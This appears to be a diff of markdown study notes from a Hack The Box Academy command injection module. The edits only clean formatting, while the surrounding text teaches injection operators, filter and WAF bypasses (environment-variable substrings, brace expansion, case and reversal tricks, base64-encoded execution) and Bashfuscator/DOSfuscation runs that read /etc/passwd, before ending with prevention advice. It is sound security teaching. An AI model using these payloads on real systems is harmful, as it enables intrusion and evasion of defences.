@@ -77,8 +77,6 @@ The cheat sheet is a useful command reference for this module.
 
 <table><thead><tr><th width="371">Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>'</code> or <code>"</code></td><td>Total must be even</td></tr><tr><td><code>^</code></td><td>Windows only (CMD)</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>WhoAmi</code></td><td>Simply send the character with odd cases</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td><code>"whoami"[-1..-20] -join ''</code></td><td>Reverse a string</td></tr><tr><td><code>iex "$('imaohw'[-1..-20] -join '')"</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code></td><td>Encode a string with base64</td></tr><tr><td><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"</code></td><td>Execute b64 encoded string</td></tr></tbody></table>
 
-
-
 ## Intro to Command Injections
 
 ***
@@ -142,8 +140,6 @@ Likewise, other web development programming languages have similar functions use
 
 The following section will discuss different methods of detecting and exploiting command injection vulnerabilities in web applications.
 
-
-
 ## Detection
 
 ***
@@ -197,8 +193,6 @@ Note: The only exception may be the semi-colon `;`, which will not work if the c
 
 In the next section, we will attempt to use one of the above injection operators to exploit the `Host Checker` exercise.
 
-
-
 ## Injecting Commands
 
 ***
@@ -219,7 +213,7 @@ ping -c 1 127.0.0.1; whoami
 
 First, let's try running the above command on our Linux VM to ensure it does run:
 
-&#x20; Injecting Commands
+Injecting Commands
 
 ```shell-session
 21y4d@htb[/htb]$ ping -c 1 127.0.0.1; whoami
@@ -263,8 +257,6 @@ We can now customize our HTTP request and send it to see how the web application
 
 As we can see, the response we got this time contains the output of the `ping` command and the result of the `whoami` command, `meaning that we successfully injected our new command`.
 
-
-
 ## Other Injection Operators
 
 ***
@@ -285,7 +277,7 @@ ping -c 1 127.0.0.1 && whoami
 
 As we always should, let's try to run the command on our Linux VM first to ensure that it is a working command:
 
-&#x20; Other Injection Operators
+Other Injection Operators
 
 ```shell-session
 21y4d@htb[/htb]$ ping -c 1 127.0.0.1 && whoami
@@ -313,7 +305,7 @@ Finally, let us try the `OR` (`||`) injection operator. The `OR` operator only e
 
 If we try to use our usual payload with the `||` operator (`127.0.0.1 || whoami`), we will see that only the first command would execute:
 
-&#x20; Other Injection Operators
+Other Injection Operators
 
 ```shell-session
 21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami
@@ -332,7 +324,7 @@ This is because of how `bash` commands work. As the first command returns exit c
 
 Let us try to intentionally break the first command by not supplying an IP and directly using the `||` operator (`|| whoami`), such that the `ping` command would fail and our injected command gets executed:
 
-&#x20; Other Injection Operators
+Other Injection Operators
 
 ```shell-session
 21y4d@htb[/htb]$ ping -c 1 || whoami
@@ -359,13 +351,11 @@ Such operators can be used for various injection types, like SQL injections, LDA
 | Object Injection                        | `;` `&` `\|`                                      |
 | XQuery Injection                        | `'` `;` `--` `/* */`                              |
 | Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
-| Header Injection                        |  `\r`  `%0d` `%0a` `%09`                          |
+| Header Injection                        |  `%0d` `%0a` `%09`                                |
 
 Keep in mind that this table is incomplete, and many other options and operators are possible. It also highly depends on the environment we are working with and testing.
 
 In this module, we are mainly dealing with direct command injections, in which our input goes directly into the system command, and we are receiving the output of the command. For more on advanced command injections, like indirect injections or blind injection, you may refer to the [Whitebox Pentesting 101: Command Injection](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) module, which covers advanced injections methods and many other topics.
-
-
 
 ## Identifying Filters
 
@@ -426,8 +416,6 @@ Let us reduce our request to one character at a time and see when it gets blocke
 
 We still get an `invalid input`, error meaning that a semi-colon is blacklisted. So, let's see if all of the injection operators we discussed previously are blacklisted.
 
-
-
 ## Bypassing Space Filters
 
 ***
@@ -470,7 +458,7 @@ We see that our request was not denied this time, and we bypassed the space filt
 
 There are many other methods we can utilize to bypass space filters. For example, we can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows:
 
-&#x20; Bypassing Space Filters
+Bypassing Space Filters
 
 ```shell-session
 root@htb[/htb]$ {ls,-la}
@@ -483,8 +471,6 @@ drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
 As we can see, the command was successfully executed without having spaces in it. We can utilize the same method in command injection filter bypasses, by using brace expansion on our command arguments, like (`127.0.0.1%0a{ls,-la}`). To discover more space filter bypasses, check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.
 
 Exercise: Try to look for other methods for bypassing space filters, and use them with the `Host Checker` web application to learn how they work.
-
-
 
 ## Bypassing Other Blacklisted Characters
 
@@ -500,7 +486,7 @@ There are many techniques we can utilize to have slashes in our payload. One suc
 
 For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:
 
-&#x20; Bypassing Other Blacklisted Characters
+Bypassing Other Blacklisted Characters
 
 ```shell-session
 root@htb[/htb]$ echo ${PATH}
@@ -510,7 +496,7 @@ root@htb[/htb]$ echo ${PATH}
 
 So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:
 
-&#x20; Bypassing Other Blacklisted Characters
+Bypassing Other Blacklisted Characters
 
 ```shell-session
 root@htb[/htb]$ echo ${PATH:0:1}
@@ -522,7 +508,7 @@ Note: When we use the above command in our payload, we will not add `echo`, as w
 
 We can do the same with the `$HOME` or `$PWD` environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:
 
-&#x20; Bypassing Other Blacklisted Characters
+Bypassing Other Blacklisted Characters
 
 ```shell-session
 root@htb[/htb]$ echo ${LS_COLORS:10:1}
@@ -542,7 +528,7 @@ As we can see, we successfully bypassed the character filter this time as well.
 
 The same concept work on Windows as well. For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`) :
 
-&#x20; Bypassing Other Blacklisted Characters
+Bypassing Other Blacklisted Characters
 
 ```cmd-session
 C:\htb> echo %HOMEPATH:~6,-11%
@@ -552,7 +538,7 @@ C:\htb> echo %HOMEPATH:~6,-11%
 
 We can achieve the same thing using the same variables in `Windows PowerShell`. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:
 
-&#x20; Bypassing Other Blacklisted Characters
+Bypassing Other Blacklisted Characters
 
 ```powershell-session
 PS C:\htb> $env:HOMEPATH[0]
@@ -572,7 +558,7 @@ We can also use the `Get-ChildItem Env:` PowerShell command to print all environ
 
 There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:
 
-&#x20; Bypassing Other Blacklisted Characters
+Bypassing Other Blacklisted Characters
 
 ```shell-session
 root@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
@@ -584,8 +570,6 @@ root@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
 We can use PowerShell commands to achieve the same result in Windows, though they can be quite longer than the Linux ones.
 
 Exercise: Try to use the the character shifting technique to produce a semi-colon `;` character. First find the character before it in the ascii table, and then use it in the above command.
-
-
 
 ## Bypassing Blacklisted Commands
 
@@ -626,7 +610,7 @@ One very common and easy obfuscation technique is inserting certain characters w
 
 The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:
 
-&#x20; Bypassing Blacklisted Commands
+Bypassing Blacklisted Commands
 
 ```shell-session
 21y4d@htb[/htb]$ w'h'o'am'i
@@ -636,7 +620,7 @@ The easiest to use are quotes, and they work on both Linux and Windows servers. 
 
 The same works with double-quotes as well:
 
-&#x20; Bypassing Blacklisted Commands
+Bypassing Blacklisted Commands
 
 ```shell-session
 21y4d@htb[/htb]$ w"h"o"am"i
@@ -673,7 +657,7 @@ Exercise: Try the above two examples in your payload, and see if they work in by
 
 There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (`^`) character, as we can see in the following example:
 
-&#x20; Bypassing Blacklisted Commands
+Bypassing Blacklisted Commands
 
 ```cmd-session
 C:\htb> who^ami
@@ -682,8 +666,6 @@ C:\htb> who^ami
 ```
 
 In the next section, we will discuss some more advanced techniques for command obfuscation and filter bypassing.
-
-
 
 ## Advanced Command Obfuscation
 
@@ -699,7 +681,7 @@ One command obfuscation technique we can use is case manipulation, like invertin
 
 If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```powershell-session
 PS C:\htb> WhOaMi
@@ -709,7 +691,7 @@ PS C:\htb> WhOaMi
 
 However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```shell-session
 21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
@@ -749,7 +731,7 @@ Another command obfuscation technique we will discuss is reversing commands and 
 
 We can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we'd have to get the reversed string of our command in our terminal, as follows:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```shell-session
 root@htb[/htb]$ echo 'whoami' | rev
@@ -758,7 +740,7 @@ imaohw
 
 Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```shell-session
 21y4d@htb[/htb]$ $(rev<<<'imaohw')
@@ -776,7 +758,7 @@ Tip: If you wanted to bypass a character filter with the above method, you'd hav
 
 The same can be applied in `Windows.` We can first reverse a string, as follows:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```powershell-session
 PS C:\htb> "whoami"[-1..-20] -join ''
@@ -786,7 +768,7 @@ imaohw
 
 We can now use the below command to execute a reversed string with a PowerShell sub-shell (`iex "$()"`), as follows:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```powershell-session
 PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
@@ -802,7 +784,7 @@ The final technique we will discuss is helpful for commands containing filtered 
 
 We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding). Let's take `base64` as an example. First, we'll encode the payload we want to execute (which includes filtered characters):
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```shell-session
 root@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
@@ -812,7 +794,7 @@ Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
 
 Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```shell-session
 root@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
@@ -834,7 +816,7 @@ Even if some commands were filtered, like `bash` or `base64`, we could bypass th
 
 We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```powershell-session
 PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
@@ -844,7 +826,7 @@ dwBoAG8AYQBtAGkA
 
 We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```shell-session
 root@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
@@ -854,7 +836,7 @@ dwBoAG8AYQBtAGkA
 
 Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:
 
-&#x20; Advanced Command Obfuscation
+Advanced Command Obfuscation
 
 ```powershell-session
 PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
@@ -865,8 +847,6 @@ PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::Fr
 As we can see, we can get creative with `Bash` or `PowerShell` and create new bypassing and obfuscation methods that have not been used before, and hence are very likely to bypass filters and WAFs. Several tools can help us automatically obfuscate our commands, which we will discuss in the next section.
 
 In addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. We can find some such techniques on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).
-
-
 
 ## Evasion Tools
 
@@ -880,7 +860,7 @@ If we are dealing with advanced security tools, we may not be able to use basic,
 
 A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:
 
-&#x20; Evasion Tools
+Evasion Tools
 
 ```shell-session
 root@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
@@ -891,7 +871,7 @@ root@htb[/htb]$ python3 setup.py install --user
 
 Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the `-h` help menu:
 
-&#x20; Evasion Tools
+Evasion Tools
 
 ```shell-session
 root@htb[/htb]$ cd ./bashfuscator/bin/
@@ -911,7 +891,7 @@ Program Options:
 
 We can start by simply providing the command we want to obfuscate with the `-c` flag:
 
-&#x20; Evasion Tools
+Evasion Tools
 
 ```shell-session
 root@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
@@ -924,7 +904,7 @@ root@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
 
 However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:
 
-&#x20; Evasion Tools
+Evasion Tools
 
 ```shell-session
 root@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
@@ -937,7 +917,7 @@ eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ pri
 
 We can now test the outputted command with `bash -c ''`, to see whether it does execute the intended command:
 
-&#x20; Evasion Tools
+Evasion Tools
 
 ```shell-session
 root@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
@@ -956,7 +936,7 @@ Exercise: Try testing the above command with our web application, to see if it c
 
 There is also a very similar tool that we can use for Windows called [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation). Unlike `Bashfuscator`, this is an interactive tool, as we run it once and interact with it to get the desired obfuscated command. We can once again clone the tool from GitHub and then invoke it through PowerShell, as follows:
 
-&#x20; Evasion Tools
+Evasion Tools
 
 ```powershell-session
 PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
@@ -977,7 +957,7 @@ Choose one of the below options:
 
 We can even use `tutorial` to see an example of how the tool works. Once we are set, we can start using the tool, as follows:
 
-&#x20; Evasion Tools
+Evasion Tools
 
 ```powershell-session
 Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
@@ -991,7 +971,7 @@ typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%System
 
 Finally, we can try running the obfuscated command on `CMD`, and we see that it indeed works as expected:
 
-&#x20; Evasion Tools
+Evasion Tools
 
 ```cmd-session
 C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
@@ -1002,8 +982,6 @@ test_flag
 Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`. Run `pwsh`, and then follow the exact same command from above. This tool is installed by default in your \`Pwnbox\` instance. You can also find installation instructions at this [link](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).
 
 For more on advanced obfuscation methods, you may refer to the [Secure Coding 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) module, which covers advanced obfuscations methods that can be utilized in various attacks, including the ones we covered in this module.
-
-
 
 ## Command Injection Prevention
 
@@ -1103,6 +1081,3 @@ Finally, we should make sure that our back-end server is securely configured to 
 * Avoid the use of sensitive/outdated libraries and modules (e.g. [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php))
 
 In the end, even after all of these security mitigations and configurations, we have to perform the penetration testing techniques we learned in this module to see if any web application functionality may still be vulnerable to command injection. As some web applications have millions of lines of code, any single mistake in any line of code may be enough to introduce a vulnerability. So we must try to secure the web application by complementing secure coding best practices with thorough penetration testing.
-
-
-
